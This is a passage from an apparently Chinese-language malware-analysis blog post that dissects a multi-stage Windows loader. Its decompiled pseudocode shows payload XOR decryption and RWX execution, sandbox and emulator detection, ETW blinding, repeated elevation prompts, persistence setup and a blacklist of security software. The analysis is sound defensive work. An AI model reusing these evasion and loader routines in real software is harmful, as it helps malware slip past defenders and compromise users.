class="number">-100000000LL</span>;</span><br><span class="line">      ntdelay_status = pNtDelayExecution(a1, a2, &amp;delay_interval_100ns, <span class="number">0LL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(xor_key, <span class="string">&quot;1ce2b@!AC4FdtbreSVc8&quot;</span>);</span><br><span class="line">  payload_size = <span class="number">312337LL</span>;</span><br><span class="line">  memory_alloc_protect_stress_test((__int64)a1, a2, v13, <span class="number">0x4C411u</span>LL, v14, v15);</span><br><span class="line">  anti_analysis_exit_gate((__int64)a1, a2);</span><br><span class="line">  <span class="keyword">if</span> ( check_pfxinitialize_signature((__int64)a1, a2, v16, v17, v18, v19) )</span><br><span class="line">  &#123;</span><br><span class="line">    rdtsc_accum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( rdtsc_i = <span class="number">0</span>; rdtsc_i &lt; <span class="number">1000</span>; ++rdtsc_i )</span><br><span class="line">    &#123;</span><br><span class="line">      v22 = __rdtsc();</span><br><span class="line">      rdtsc_accum += v22;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy</span>(exitprocess_name, <span class="string">&quot;ExitProcess&quot;</span>);</span><br><span class="line">    pExitProcess = (<span class="type">void</span> (__fastcall *)(_BYTE *, __int64, __int64, _QWORD))resolve_api_via_hash_bridge(</span><br><span class="line">                                                                             (__int64)a1,</span><br><span class="line">                                                                             a2,</span><br><span class="line">                                                                             (__int64)exitprocess_name,</span><br><span class="line">                                                                             (__int64)kernel32_name,</span><br><span class="line">                                                                             v20,</span><br><span class="line">                                                                             v21);</span><br><span class="line">    pExitProcess(a1, a2, v23, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(getprocessheap_name, <span class="string">&quot;GetProcessHeap&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(heapalloc_name, <span class="string">&quot;HeapAlloc&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(heapfree_name, <span class="string">&quot;HeapFree&quot;</span>);</span><br><span class="line">  pGetProcessHeap = (__int64 (*)(<span class="type">void</span>))resolve_api_via_hash_bridge(</span><br><span class="line">                                         (__int64)a1,</span><br><span class="line">                                         a2,</span><br><span class="line">                                         (__int64)getprocessheap_name,</span><br><span class="line">                                         (__int64)kernel32_name,</span><br><span class="line">                                         v20,</span><br><span class="line">                                         v21);</span><br><span class="line">  pHeapAlloc = (__int64 (__fastcall *)(_BYTE *, __int64, __int64, __int64, <span class="type">unsigned</span> __int64))resolve_api_via_hash_bridge(</span><br><span class="line">                                                                                               (__int64)a1,</span><br><span class="line">                                                                                               a2,</span><br><span class="line">                                                                                               (__int64)heapalloc_name,</span><br><span class="line">                                                                                               (__int64)kernel32_name,</span><br><span class="line">                                                                                               v24,</span><br><span class="line">                                                                                               v25);</span><br><span class="line">  pHeapFree = (<span class="type">void</span> (__fastcall *)(_BYTE *, __int64, _QWORD, __int64, __int64 (*)(<span class="type">void</span>)))resolve_api_via_hash_bridge(</span><br><span class="line">                                                                                           (__int64)a1,</span><br><span class="line">                                                                                           a2,</span><br><span class="line">                                                                                           (__int64)heapfree_name,</span><br><span class="line">                                                                                           (__int64)kernel32_name,</span><br><span class="line">                                                                                           v26,</span><br><span class="line">                                                                                           v27);</span><br><span class="line">  v28 = pGetProcessHeap();</span><br><span class="line">  payload_heap_buf = (__int64 (*)(<span class="type">void</span>))pHeapAlloc(a1, a2, <span class="number">8LL</span>, v28, payload_size);</span><br><span class="line">  copy_bytes((<span class="type">int</span>)a1, a2, byte_38, payload_heap_buf, payload_size);</span><br><span class="line">  xor_decrypt_buffer_with_key((<span class="type">int</span>)a1, a2, payload_size, (__int64)payload_heap_buf, (__int64)xor_key);</span><br><span class="line">  <span class="built_in">strcpy</span>(virtualprotect_name, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">  pVirtualProtect = (<span class="type">unsigned</span> <span class="type">int</span> (__fastcall *)(_BYTE *, __int64, <span class="type">unsigned</span> __int64, __int64 (*)(<span class="type">void</span>), __int64, _BYTE *))resolve_api_via_hash_bridge((__int64)a1, a2, (__int64)virtualprotect_name, (__int64)kernel32_name, v29, v30);</span><br><span class="line">  <span class="keyword">if</span> ( !pVirtualProtect(a1, a2, payload_size, payload_heap_buf, <span class="number">64LL</span>, old_protect) )</span><br><span class="line">  &#123;</span><br><span class="line">    v31 = pGetProcessHeap();</span><br><span class="line">    pHeapFree(a1, a2, <span class="number">0LL</span>, v31, payload_heap_buf);</span><br><span class="line">    stage1_loader_entry(a1, a2, v32, v33, v34, v35);</span><br><span class="line">  &#125;</span><br><span class="line">  stage2_entry = payload_heap_buf;</span><br><span class="line">  syncCreate = (<span class="type">void</span> (*)(<span class="type">void</span>))payload_heap_buf();</span><br><span class="line">  syncCreate();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个阶段主要做了以下几件事情：</p>
<h4 id="查询权限并尝试通过弹窗提权"><a href="#查询权限并尝试通过弹窗提权" class="headerlink" title="查询权限并尝试通过弹窗提权"></a>查询权限并尝试通过弹窗提权</h4><p><code>OpenProcessToken(a1, a2, TOKEN_QUERY, v12, &amp;hToken)</code></p>
<p><code>GetTokenInformation(a1, a2, TokenElevation, hToken, &amp;is_elevated, 4LL)</code></p>
<p>如果未提权就不断请求以管理员权限运行程序。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771236541050.png" alt="1771236541050"></p>
<h4 id="反分析与反沙箱"><a href="#反分析与反沙箱" class="headerlink" title="反分析与反沙箱"></a>反分析与反沙箱</h4><h5 id="时间检查"><a href="#时间检查" class="headerlink" title="时间检查"></a>时间检查</h5><p>利用 <code>QueryPerformanceCounter</code> 和 <code>Sleep</code> 的时间差，检测沙箱是否使用了”Sleep Acceleration”。并且 <code>check_thread_increment_consistency</code>中还调用 <code>CreateThread</code> 创建两个线程，执行计算循环进行压力测试。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771239139750.png" alt="1771239139750"></p>
<p>通过 <code>timing_sleep_integrity_check</code>以后会真正进行一次休眠，但直接调用 <code>ntdll.dll</code> 中的 <code>NtDelayExecution</code>，不再信任 <code>Sleep</code></p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771239354154.png" alt="1771239354154"></p>
<h5 id="内存压力测试"><a href="#内存压力测试" class="headerlink" title="内存压力测试"></a>内存压力测试</h5><p>外层循环 5 次，内层循环 100 次。</p>
<p>每次申请 <code>12288</code> 字节 (12KB) 的 <code>PAGE_READWRITE</code> (4) 内存。向申请的内存中填充字节 <code>35</code> (‘#’)。调用 <code>VirtualProtect</code> 将这 100 块内存修改为 <code>PAGE_EXECUTE_READWRITE</code> (64, 0x40)。调用 <code>VirtualFree</code> 释放所有内存。</p>
<h5 id="API特征探测"><a href="#API特征探测" class="headerlink" title="API特征探测"></a>API特征探测</h5><p><code>check_pfxinitialize_signature</code>利用了 <code>PfxInitialize</code>的返回值 <code>Table[0]</code>在真机中一定为 <code>0x200</code>的特性来检测模拟执行, 一些模拟执行框架对API实现不完整会在这里返回值错误。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771240744653.png" alt="1771240744653"></p>
<h5 id="其他测试"><a href="#其他测试" class="headerlink" title="其他测试"></a>其他测试</h5><p><code>anti_analysis_placeholder_check</code>在栈上写 <code>0xDEAD</code> 和 <code>0xBEEF</code>，然后立刻读回来检查值是否改变。不清楚是什么原理。</p>
<p><code>rdtsc_lowbyte_zero_check</code>用了大量的 <code>imul rax, 0</code> 和 <code>imul rcx, 1</code>计算栈偏移，它先写一个标志位，然后执行 <code>rdtsc</code>，然后写另一个位置，最后检查第一个标志位是否被覆盖。同样不明白是什么原理。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771240050581.png" alt="1771240050581"></p>
<p><code>self_patch_magic_check</code>调用 <code>VirtualProtect</code> 将 <code>magic_value_probe</code> 函数所在的代码页修改为 <code>PAGE_EXECUTE_READWRITE</code>，这修改了 <code>mov</code> 指令的操作数。原始是 <code>0x0000DEAD</code>，修改后变成了 <code>0x0000BEEF</code>。现代 CPU 有非常强的缓存一致性协议。当写入代码段时，CPU 会自动废弃指令缓存（I-Cache）中的旧代码，重新从内存（L1 D-Cache&#x2F;L2）拉取新指令。因此，返回值应该是修改后的 <code>0xBEEF</code> (48879)。许多模拟器为了性能，依然会执行旧的缓存代码。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771240431244.png" alt="1771240431244"></p>
<h4 id="解密第二阶段样本"><a href="#解密第二阶段样本" class="headerlink" title="解密第二阶段样本"></a>解密第二阶段样本</h4><p><img src="/image/2026-02-12-malware_analysis_2/1771240805954.png" alt="1771240805954"></p>
<h3 id="stage-2"><a href="#stage-2" class="headerlink" title="stage 2"></a>stage 2</h3><p>这个阶段主要做了以下事情：</p>
<ol>
<li>解压 stage3 PE，一个dll文件。</li>
<li>手动映射 stage3 PE，调用入口点DLLMAIN解混淆</li>
<li>在 stage3 导出表中按名字 <code>SyncCreate</code> 查找</li>
<li>把命中的导出地址写到输出参数 <code>a8</code></li>
<li>函数末尾 <code>return a8</code></li>
</ol>
<h3 id="stage-3"><a href="#stage-3" class="headerlink" title="stage 3"></a>stage 3</h3><p>该阶段代码大量使用”不透明谓词”来混淆代码，有些if判断条件是”永真”，有些是”永假”.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">SyncCreate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> is_first_instance; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// al</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+2Ch] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+34h] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+3Ch] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> is_first_instance_i32; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+44h] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4Ch] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = g_opq_seed_9;                            <span class="comment">// Opaque-predicate seed math (return0/return2/return7 + globals) used to gate real logic; effectively noise from control-flow obfuscation.</span></span><br><span class="line">  v5 = return7() + v3;</span><br><span class="line">  v4 = return2();</span><br><span class="line">  <span class="keyword">if</span> ( (return0() * v4 + v5) / (<span class="type">unsigned</span> <span class="type">int</span>)g_opq_divisor_8 != g_opq_expected_quotient_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    is_first_instance = check_mutex_not_exists();</span><br><span class="line">    is_first_instance_i32 = return_input_value((<span class="type">double</span>)is_first_instance);</span><br><span class="line">    v6 = g_opq_seed_9;</span><br><span class="line">    v8 = return7() + v6;</span><br><span class="line">    v7 = <span class="number">6</span> * return2();</span><br><span class="line">    <span class="keyword">if</span> ( ((return0() * v7 + v8) / (<span class="type">unsigned</span> <span class="type">int</span>)g_opq_divisor_8 - g_opq_expected_quotient_1) * is_first_instance_i32 )</span><br><span class="line">      stage3_synccreate_main();</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = g_opq_seed_9;</span><br><span class="line">  v12 = return7() + v10;</span><br><span class="line">  v11 = <span class="number">3</span> * return2();</span><br><span class="line">  v1 = return0();</span><br><span class="line">  result = return_input_value((<span class="type">double</span>)(<span class="type">int</span>)((v1 * v11 + v12) / (<span class="type">unsigned</span> <span class="type">int</span>)g_opq_divisor_8 - g_opq_expected_quotient_1));</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实际上还原出来的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">SyncCreate</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (check_mutex_not_exists())</span><br><span class="line">        stage3_synccreate_main();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_mutex_not_exists</code>调用 <code>CreateMutexA</code>创建互斥体，<code>GetLastError() == 183 (ERROR_ALREADY_EXISTS)</code> 判定是否已有实例。</p>
<p>解码后的互斥体GUID：<code>dba8937c-2842-4159-9bea-56424baf5eba</code></p>
<p>666还有社工：</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771246358711.png" alt="1771246358711"></p>
<p><code>stage3_synccreate_main</code>伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">stage3_synccreate_main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  stage3_anti_analysis_init_or_exit();</span><br><span class="line">  check_memory_size();</span><br><span class="line">  SetProcessShutdownParameters(<span class="number">1u</span>, <span class="number">1u</span>); <span class="comment">//关机时最后一个被关闭</span></span><br><span class="line">  <span class="keyword">if</span> (!SetConsoleCtrlHandler(HandlerRoutine, <span class="number">1</span>))</span><br><span class="line">    SetConsoleCtrlHandler(HandlerRoutine, <span class="number">1</span>); <span class="comment">//拦截控制台收到的关闭信号</span></span><br><span class="line">  DetectSandboxAndGetUAC((__int64)v13);</span><br><span class="line">  MakeVirus((__int64)v14);</span><br><span class="line">  ProcessExitWithCleanup(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反分析初始化"><a href="#反分析初始化" class="headerlink" title="反分析初始化"></a>反分析初始化</h4><p><img src="/image/2026-02-12-malware_analysis_2/1771246550892.png" alt="1771246550892"></p>
<p><code>patch_nttraceevent_ret</code>：将 <code>ntdll!NtTraceEvent</code> 首字节改为 <code>0xC3</code>（RET）进行ETW致盲。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771246580994.png" alt="1771246580994"></p>
<p><code>check_self_path_contains_myapp_exe</code>调用 <code>GetModuleFileNameW</code>对比程序名是否包含:\myapp.exe</p>
<p><code>check_ntdll_export_namehash_blacklist</code>：遍历 <code>ntdll</code> 导出名，按 <code>hash_rol3_xor_plus1</code> 哈希，与 3 个黑名单值比较，命中即退出。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771246718037.png" alt="1771246718037"></p>
<p><code>check_process_in_job_object</code>和 <code>check_ntcompresskey_anomaly</code>都是用于Defender 模拟器探测</p>
<ul>
<li><code>NtIsProcessInJob</code> ：传入特定句柄，检查返回值是否为 <code>0x125</code></li>
<li><code>NtCompressKey</code> ：传入无效句柄，如果返回“成功”，说明是模拟器的“宽容”执行机制。</li>
</ul>
<p><code>check_computername_blacklist</code>调用 <code>GetComputerNameA</code>主机名黑名单（如 <code>HAL9TH</code>、<code>JOHNDOE</code>）。</p>
<h4 id="内存检查"><a href="#内存检查" class="headerlink" title="内存检查"></a>内存检查</h4><p>在 <code>check_memory_size</code> 中核心调用 <code>check_memory_size_impl</code>，参数固定为 <code>a1=2</code></p>
<p>调用 <code>GlobalMemoryStatusEx</code>，读取 <code>ullTotalPhys</code> 并换算 <code>GB</code>，比较条件为 <code>a1 &gt; (ullTotalPhys / 1073741824.0)</code>；</p>
<p>即最小内存阈值检查（2GB）。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771248184315.png" alt="1771248184315"></p>
<h4 id="反沙箱检查"><a href="#反沙箱检查" class="headerlink" title="反沙箱检查"></a>反沙箱检查</h4><p>去掉”不透明谓词”后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">DetectSandboxAndGetUAC_impl</span><span class="params">(int64 ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (anti_vm_system_probe_a()) ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (anti_vm_pid_dll_probe_b()) ExitProcess(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sandbox_heapalloc_timing_check() ||</span><br><span class="line">        !sandbox_numa_and_sxin_probe_check() ||</span><br><span class="line">        !check_min_processor_count(<span class="number">2</span>))</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!check_mutex_artifact_gate()) ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (timing_qpc_sleep_gate()) ExitProcess(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (timing_tickcount_sleep_gate()) ExitProcess(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> seed[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> enc[<span class="number">24</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *path = decode_path_blob_lazy(copy_path_blob_seed(seed, enc));</span><br><span class="line">    <span class="keyword">if</span> (is_regular_file_exists(ctx, path))</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    elevate_and_relaunch_self_then_exit();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>anti_vm_system_probe_a</code>调用ntdll.PfxInitialize并检测返回值是否为0x200的方式反模拟执行。</p>
<p><code>anti_vm_pid_dll_probe_b</code>通过空参数调用pid.DllGetClassObject并判断结果是否为0x80040111的方式检测模拟执行。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771310520891.png" alt="1771310520891"></p>
<p><code>sandbox_heapalloc_timing_check</code>调用 <code>HeapAlloc(0x5F5E100)</code>并空转计数进行压力测试</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771310950970.png" alt="1771310950970"></p>
<p><code>sandbox_numa_and_sxin_probe_check</code>通过 <code>VirtualAllocNuma</code>申请内存检测模拟执行，通过检测是否加载 <code>SxIn.dll</code>来检测360虚拟沙盒</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771311183932.png" alt="1771311183932"></p>
<p><code>check_min_processor_count(2)</code>通过调用 <code>GetSystemInfo</code>检测CPU核心是否小于2</p>
<p><code>check_mutex_artifact_gate</code>创建名为 <code>Global\3575D265-2C4F-5C20-EB78-D147D5670A9C</code>的互斥体, 如果创建失败则结束运行</p>
<p><code>timing_qpc_sleep_gate</code>调用 <code>QueryPerformance</code>系列函数检测时间。</p>
<p><img src="/image/2026-02-12-malware_analysis_2/1771313290602.png" alt="1771313290602"></p>
<p><code>timing_tickcount_sleep_gate</code>调用 <code>GetTickCount64</code>函数检测时间流速</p>
<p>检测 <code>C:\xxxx.ini</code>文件是否存在且不是目录</p>
<p><code>elevate_and_relaunch_self_then_exit</code>和之前一样不断弹出窗口进行提权。</p>
<h4 id="MakeVirus流程"><a href="#MakeVirus流程" class="headerlink" title="MakeVirus流程"></a>MakeVirus流程</h4><p>去混淆后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">MakeVirus_impl</span><span class="params">(ctx)</span> &#123;</span><br><span class="line">    scan_blacklisted_processes_return_pid();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (env_window_process_gate_check(ctx)) &#123;</span><br><span class="line">        <span class="comment">// 启动 3 个线程执行 StartAddress</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">3</span>; k++) &#123;</span><br><span class="line">            HANDLE h = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, StartAddress, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (h) &#123;</span><br><span class="line">                Sleep(<span class="number">5000</span>);</span><br><span class="line">                <span class="keyword">if</span> (env_window_process_gate_check(ctx) != <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!check_windows_version_supported()) &#123;</span><br><span class="line">            drop_files_and_set_registry_persistence(ctx, (<span class="type">char</span>*)(ctx + <span class="number">1</span>));</span><br><span class="line">            Sleep(<span class="number">5000</span>);</span><br><span class="line">            <span class="keyword">if</span> (GetFileAttributesA((<span class="type">char</span>*)(ctx + <span class="number">279</span>)) != <span class="number">-1</span> &amp;&amp;</span><br><span class="line">                GetFileAttributesA((<span class="type">char</span>*)(ctx + <span class="number">799</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">                run_embedded_task_payload_variant_a(ctx);</span><br><span class="line">                <span class="keyword">if</span> (scan_blacklisted_processes_return_pid()) &#123;</span><br><span class="line">                    force_shutdown_or_logoff_loop(ctx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                relaunch_self_via_shellexecute_runas_then_exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (env_window_process_gate_check(ctx)) &#123;</span><br><span class="line">                unknown_libname_2(...);   <span class="comment">// no-op</span></span><br><span class="line">                sub_180012250();          <span class="comment">// 额外 COM/WMI 类动作</span></span><br><span class="line">            &#125;</span><br><span class="line">            Sleep(<span class="number">2000</span>);</span><br><span class="line">            drop_files_and_set_registry_persistence(ctx, (<span class="type">char</span>*)(ctx + <span class="number">1</span>));</span><br><span class="line">            Sleep(<span class="number">5000</span>);</span><br><span class="line">            <span class="keyword">if</span> (GetFileAttributesA((<span class="type">char</span>*)(ctx + <span class="number">279</span>)) != <span class="number">-1</span> &amp;&amp;</span><br><span class="line">                GetFileAttributesA((<span class="type">char</span>*)(ctx + <span class="number">799</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">                setup_edgeupdate_task_script_and_persistence(ctx);</span><br><span class="line">                <span class="keyword">if</span> (scan_blacklisted_processes_return_pid()) &#123;</span><br><span class="line">                    force_shutdown_or_logoff_loop(ctx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                relaunch_self_via_shellexecute_runas_then_exit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        invoke_shellexecutea_via_dynamic_resolve(ctx);</span><br><span class="line">        Sleep(<span class="number">5000</span>);</span><br><span class="line">        drop_files_and_set_registry_persistence(ctx, (<span class="type">char</span>*)(ctx + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (GetFileAttributesA((<span class="type">char</span>*)(ctx + <span class="number">279</span>)) != <span class="number">-1</span> &amp;&amp;</span><br><span class="line">            GetFileAttributesA((<span class="type">char</span>*)(ctx + <span class="number">799</span>)) != <span class="number">-1</span>) &#123;</span><br><span class="line">            run_embedded_task_payload_variant_b(ctx);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (task_scheduler_enum_match_target_binary(ctx)) <span class="keyword">break</span>;</span><br><span class="line">                run_embedded_task_payload_variant_b(ctx);</span><br><span class="line">                Sleep(<span class="number">10000</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (scan_blacklisted_processes_return_pid()) &#123;</span><br><span class="line">                Sleep(<span class="number">2000</span>);</span><br><span class="line">                force_shutdown_or_logoff_loop(ctx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            relaunch_self_via_shellexecute_runas_then_exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    invoke_shellexecutea_via_dynamic_resolve(ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="安全软件对抗"><a href="#安全软件对抗" class="headerlink" title="安全软件对抗"></a>安全软件对抗</h5><p><code>scan_blacklisted_processes_return_pid</code>去混淆伪代码如下，遍历黑名单进程名，当找到对应的安全软件时返回其PID, 并且设置一个全局标志位代表存在安全软件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">int64 <span class="title function_">scan_blacklisted_processes_return_pid</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* black_list[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 32 组字符串：copy_blob -&gt; decode_blob</span></span><br><span class="line">    <span class="comment">// 